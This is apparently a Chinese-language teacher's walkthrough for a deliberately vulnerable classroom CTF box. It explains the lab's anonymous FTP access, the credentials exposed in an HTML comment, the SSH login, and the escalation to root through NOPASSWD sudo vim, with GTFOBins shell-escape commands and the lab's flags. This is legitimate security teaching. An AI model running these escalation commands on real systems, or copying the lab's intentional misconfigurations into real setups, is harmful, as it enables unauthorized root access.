# 《Teacher's Little Secret》完整詳解

> **CTF 靶機：老師，你的答案藏不住的**
> 給老師（出題者）使用的完整 Walkthrough，包含：解題步驟、原理拆解、學生常卡點、教學引導建議。

---

## 目錄

- [一、靶機架構速覽](#一靶機架構速覽)
- [二、攻擊鏈總覽](#二攻擊鏈總覽)
- [三、Step 1 — 偵查 Reconnaissance](#三step-1--偵查-reconnaissance)
- [四、Step 2 — Anonymous FTP（flag1）](#四step-2--anonymous-ftpflag1)
- [五、Step 3 — HTML Comment 洩漏（flag2）](#五step-3--html-comment-洩漏flag2)
- [六、Step 4 — SSH 橋接登入](#六step-4--ssh-橋接登入)
- [七、Step 5 — sudo vim 提權（flag3）](#七step-5--sudo-vim-提權flag3)
- [八、教學總結 Debriefing](#八教學總結-debriefing)
- [九、常見故障排除](#九常見故障排除)
- [十、延伸作業建議](#十延伸作業建議)

---

## 一、靶機架構速覽

```
┌────────────── deh-ctf (Docker, host network) ──────────────┐
│ Port 21  vsftpd      anonymous_enable=YES                   │
│ Port 22  OpenSSH     PasswordAuthentication yes             │
│ Port 80  Apache2     /var/www/html/index.html               │
│                                                              │
│ Users:   tsai / ILoveProgramming123                         │
│          tsai ALL=(root) NOPASSWD: /usr/bin/vim ← 提權點    │
└──────────────────────────────────────────────────────────────┘
```

| 項目 | 說明 |
|------|------|
| **基底** | `debian:bookworm-slim`（ARM64 + x86_64 通吃） |
| **網路模式** | `network_mode: host`（Linux/RPi 原生 FTP passive） |
| **預計時間** | 15–20 分鐘 |
| **難度** | Easy |
| **教學階段** | 偵查 → 資訊洩漏 → 提權 |

---

## 二、攻擊鏈總覽

完整的 **OSCP 風格殺鏈**：`Recon → Initial Access → Privilege Escalation`

```
[nmap]            掃描 → 21/22/80
   │
   ▼
[Anonymous FTP]   下載 answers_midterm.txt
   │              ─→ flag1 (資訊洩漏 / Information Disclosure)
   ▼
[HTTP source]     view-source → HTML comment
   │              ─→ flag2 + 取得 tsai 帳密 (Credential Exposure)
   ▼
[SSH]             tsai:ILoveProgramming123 登入
   │              （外部攻擊者 → 內部低權限使用者）
   ▼
[sudo -l]         發現 NOPASSWD vim
   │
   ▼
[GTFOBins vim]    sudo vim -c ':!/bin/bash'
   │              ─→ root shell
   ▼
[cat /root/...]   ─→ flag3 (Privilege Escalation)
```

| Flag | 取得方式 | 教學核心 |
|------|---------|---------|
| `flag1{midterm_ans_found_lol}` | Anonymous FTP | **預設值就是漏洞** |
| `flag2{html_comment_is_not_safe}` | View HTML source | **前端沒有秘密** |
| `flag3{sudo_vim_goes_brrrr}` | sudo vim → shell | **權限最小化原則** |

---

## 三、Step 1 — 偵查 Reconnaissance

### 解題指令

```bash
nmap -sV -sC <靶機IP>
```

### 參數意義

| 參數 | 作用 |
|------|------|
| `-sV` | 版本探測，列出每個 port 的服務與版本 |
| `-sC` | 執行預設 NSE script，**FTP 會自動嘗試 anonymous** |

### 預期輸出

```
21/tcp  open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0   0   ...  answers_midterm.txt
22/tcp  open  ssh     OpenSSH 9.2p1
80/tcp  open  http    Apache httpd 2.4.x
```

> **注意**：`-sC` 在 FTP 那邊會直接洩底——把檔名都印出來了。這是設計成「給學生一點甜頭」。

### 教學金句

> 「nmap 不是駭客工具，是水電工的三用電表。掃出來什麼服務，才知道要從哪個門進去。」

### 學生常卡點

- ❌ 沒裝 nmap → `brew install nmap` / `sudo apt install nmap`
- ❌ 只打 `nmap <IP>` 沒加 `-sV` → 只看到 port number，看不到服務
- ❌ 在同一台 Pi 上掃 `localhost` → 改用**另一台機器**掃才有意義

---

## 四、Step 2 — Anonymous FTP（flag1）

### 解法 A：互動式（推薦給新手，有「駭」的感覺）

```bash
ftp <靶機IP>
# Name: anonymous
# Password: (直接 Enter)
ftp> ls
ftp> get answers_midterm.txt
ftp> quit
cat answers_midterm.txt
# → flag1{midterm_ans_found_lol}
```

### 解法 B：一行解（給進階生）

```bash
curl ftp://anonymous:@<靶機IP>/answers_midterm.txt
```

### 原理拆解

關鍵設定（`config/vsftpd.conf`）：

```ini
# 允許匿名登入（老師的失誤）
anonymous_enable=YES
anon_root=/srv/ftp
no_anon_password=YES
```

**蔡老師的心理盲點**：

1. 他給 `tsai` 設了密碼，**以為「設了密碼 = 安全」**
2. 但 `anonymous_enable=YES` 是**另一條路**——完全繞過密碼
3. 加上 `no_anon_password=YES`，連假裝輸入 email 都不用

### 真實世界對照

- **2017 MongoDB 大規模勒贖**：預設綁定 `0.0.0.0` 沒設密碼
- **2024 各大雲端 S3 bucket 洩漏**：預設 ACL 設成 public

> **「預設值往往就是最大的漏洞。」**

### 學生常卡點

| 症狀 | 原因 | 解法 |
|------|------|------|
| FTP 連得上但 `ls` 卡住 | 被動模式不通 | `passive` 切換模式（host network 模式下應正常） |
| macOS 沒有 `ftp` 指令 | 系統移除了 | `brew install inetutils` 或改用 `curl ftp://...` |
| 不知道密碼要打什麼 | 字面理解 anonymous | 強調**直接按 Enter** = 空密碼 |

---

## 五、Step 3 — HTML Comment 洩漏（flag2）

### 解題指令

```bash
curl http://<靶機IP>/ | grep -A5 "TODO"
```

或在瀏覽器按 **Ctrl+U / Cmd+Option+U** 看原始碼。

### 關鍵內容

`web/index.html` 的尾段：

```html
<!--
  TODO: 記得把登入功能做完！
  測試帳號: tsai
  密碼: ILoveProgramming123
  （做完要刪掉這段！還有下面那個 flag 也要刪！）

  flag2{html_comment_is_not_safe}
-->
```

### 原理拆解 — 新手三大迷思

| 迷思 | 真相 |
|------|------|
| 「Comment 只有我看得到」 | HTML comment **原封不動**送給瀏覽器 |
| 「Source code 學生不會看」 | 任何瀏覽器都能 view-source，連手機都行 |
| 「反正只是測試帳號」 | **測試帳號 + 跨服務復用 = 真實憑證** |

### 真實世界對照

- **2019 某航空公司**：前端 JS 寫死 AWS access key
- **GitHub 每天**：上萬筆密碼被推上 public repo（用 `truffleHog` / `gitleaks` 一掃就有）

### 教學金句

> 「在前端寫的東西，等於貼在學校公告欄。差別只在你有沒有放大鏡。」

### 進階延伸

讓寫完的學生用正規表示式直接撈 flag：

```bash
curl -s http://<IP>/ | grep -oP 'flag\d\{[^}]+\}'
```

順便教 **regex** 與 **shell pipe**。

---

## 六、Step 4 — SSH 橋接登入

### 解題指令

```bash
ssh tsai@<靶機IP>
# 密碼: ILoveProgramming123
```

首次連線會問 `yes/no` 接受 host key——告訴學生這是**信任新主機指紋**的時刻。

### 為什麼這步沒有 flag？

這是**橋接步驟**——從「外部攻擊」轉成「內部存取」。要強調**身份的轉變**：

| 階段 | 身份 |
|------|------|
| 之前 | 沒有帳號的外部攻擊者 |
| 現在 | 合法但低權限的使用者 `tsai` |
| 下一步 | `tsai` → `root` = **Privilege Escalation** |

### 延伸教學（內部偵查）

可以順手示範**進到新主機先做的 enumeration**：

```bash
who          # 看誰在線
id           # 看自己的 uid/gid 與群組
hostname     # 主機名
uname -a     # kernel 版本（找 kernel exploit 的線索）
sudo -l      # ★ 最重要：我能 sudo 什麼？
```

讓學生養成**「進新主機第一件事就是 sudo -l」**的肌肉記憶。

---

## 七、Step 5 — sudo vim 提權（flag3）

### 解法 A：一行打完（最帥）

```bash
sudo vim -c ':!/bin/bash'
```

### 解法 B：進 vim 後再逃脫

```bash
sudo vim
# 進去後按 Esc，輸入：
:!/bin/bash
```

### 驗證 + 拿 flag

```bash
whoami       # → root
cat /root/final_grades.txt
# → flag3{sudo_vim_goes_brrrr}
```

### 原理拆解 — sudo 的設計哲學

關鍵設定（`config/sudoers`）：

```
# 蔡老師想用 vim 編輯系統設定，但不知道 vim 可以開 shell（GTFOBins！）
tsai ALL=(root) NOPASSWD: /usr/bin/vim
```

**sudo 的問題不是 sudo 本身**，而是：

> 「以 root 權限執行的程式，本身有沒有 spawn shell 的能力？」

vim 的設計哲學是「萬能編輯器」，所以提供 `:!cmd` 執行 shell command。當 **vim 本身是 root**，那 `:!/bin/bash` 開出來的 shell 自然也是 root。

### GTFOBins 必教

**[GTFOBins](https://gtfobins.github.io/)** 是「Unix binary 提權字典」。學生只要記住一句話：

> **「拿到 `sudo -l` 的輸出 → 去 GTFOBins 查 → 多半有解。」**

常見可提權的 binary：

| 類別 | Binary 範例 |
|------|------------|
| 編輯器 / 閱讀器 | `vim`, `nano`, `less`, `more`, `man` |
| 搜尋 / 找檔 | `find` → `find . -exec /bin/sh \;` |
| 腳本語言 | `awk`, `python`, `perl`, `ruby` |
| 壓縮 | `tar` → `--checkpoint-action=exec=sh` |
| 看似無害的 | `cp`, `mv`（可以蓋掉 `/etc/passwd`） |

### 老師的失誤本質

蔡老師想「限制只能用 vim」以為比較安全，但：

> **任何允許 spawn child process 的程式 ≈ root shell**

### 學生常卡點

| 症狀 | 原因 | 解法 |
|------|------|------|
| 打 `sudo vim` 後不知道怎麼出來 | 不熟 vim | 教 `:q!` 強制離開 |
| 提權成功但 prompt 沒變 `#` | shell 設定問題 | 看 `whoami`，prompt 沒變不代表沒成功 |
| `cat /root/...` 還是 Permission denied | shell 還是 tsai | 重做 `sudo vim -c ':!/bin/bash'` |

---

## 八、教學總結 Debriefing

### 1. 每個 flag 對應的核心觀念

| Flag | 觀念 | 一句話總結 |
|------|------|----------|
| flag1 | 預設值是漏洞 | 部署服務後，**永遠檢查 default config** |
| flag2 | 前端沒有秘密 | 任何送到瀏覽器的東西都是 public |
| flag3 | 權限最小化原則 | 不要為了方便給 NOPASSWD；不要 sudo 任何能 spawn shell 的程式 |

### 2. 反問學生（強化記憶）

- 「如果蔡老師把 `anonymous_enable=NO`，flag1 還拿得到嗎？」
- 「如果 HTML comment 改成寫在後端 log，問題就解決了嗎？」
  - 答：**不會**，log 也會被洩漏（LFI、log poisoning）
- 「如果 sudo 改成 `NOPASSWD: /bin/cat`，還能提權嗎？」
  - 答：**不能拿 shell，但能讀 `/etc/shadow` 破密碼**

### 3. 真實世界連結

| Flag | 對應真實事件 / 工具 |
|------|-------------------|
| flag1 | Shodan 上每天能搜到上萬台開放匿名 FTP |
| flag2 | GitHub Secrets Scanner、TruffleHog、gitleaks |
| flag3 | CVE-2021-3156（sudo Baron Samedit） |

---

## 九、常見故障排除

| 症狀 | 原因 | 解法 |
|------|------|------|
| `ftp> ls` 卡住 | passive mode 不通 | 確認用 `network_mode: host`；macOS 上跑不起來是正常的 |
| SSH 拒絕連線 | sshd 沒啟動 | `docker compose logs` 檢查 service 是否都起來 |
| nmap 掃不到 port | 防火牆 / 網段不通 | 確認靶機與攻擊機在同一網段，`ping` 測試 |
| sudo vim 後不是 root | shell 沒接好 | 確認用 `sudo vim -c ':!/bin/bash'`，不要漏冒號 |
| flag3 還是讀不到 | 還在 tsai shell | `whoami` 確認；重做提權 |
| Container 一直 restart | start.sh 有錯 | `docker compose logs deh-ctf` 看錯誤訊息 |

---

## 十、延伸作業建議

### 給寫完的學生（快手挑戰）

1. **改造靶機**：把 `sudo vim` 換成 `sudo find`，自己用 GTFOBins 查解法
2. **寫一鍵解題腳本**：`bash + curl + sshpass` 全自動拿 3 flag
3. **找隱藏漏洞**：本靶機所有「沒打算當解法但其實能用」的洞
   - directory listing？
   - apache 版本 CVE？
   - vsftpd 已知漏洞？

### 給想深入的學生（進階主題）

| 主題 | 推薦資源 |
|------|---------|
| Linux 提權系統化學習 | HackTricks、PayloadsAllTheThings |
| 自動化 enumeration | LinPEAS、linux-smart-enumeration |
| 真實靶機練習 | TryHackMe（免費）、HTB Academy |
| 證照路線 | CompTIA Security+ → OSCP |

---

## 附錄：完整指令速查

```bash
# Step 1 — 偵查
nmap -sV -sC <IP>

# Step 2 — FTP（flag1）
curl ftp://anonymous:@<IP>/answers_midterm.txt

# Step 3 — HTML（flag2）
curl -s http://<IP>/ | grep -oP 'flag\d\{[^}]+\}'

# Step 4 — SSH
ssh tsai@<IP>          # 密碼 ILoveProgramming123

# Step 5 — 提權（flag3）
sudo -l
sudo vim -c ':!/bin/bash'
cat /root/final_grades.txt
```

---

**設計者**：數位實驗高中資安課
**版本**：v1.0
**最後更新**：2026-05-27
